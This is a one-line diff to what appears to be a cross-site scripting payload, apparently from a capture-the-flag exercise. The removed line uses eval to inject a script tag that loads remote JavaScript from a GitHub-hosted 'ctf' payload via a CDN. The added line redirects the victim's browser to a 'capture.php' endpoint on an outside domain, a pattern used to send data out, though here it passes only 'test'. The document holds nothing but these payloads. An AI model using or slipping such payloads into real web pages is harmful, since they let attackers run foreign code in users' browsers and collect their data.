@@ -1,1 +1,1 @@
-eval('var a=document.createElement(\'script\');a.src=\'https://cdn.jsdelivr.net/gh/Cillian-Collins/ctf@main/payload.js\';document.body.appendChild(a)')
+window.location.href = "https://westernsecurity.ie/capture.php?payload=test";
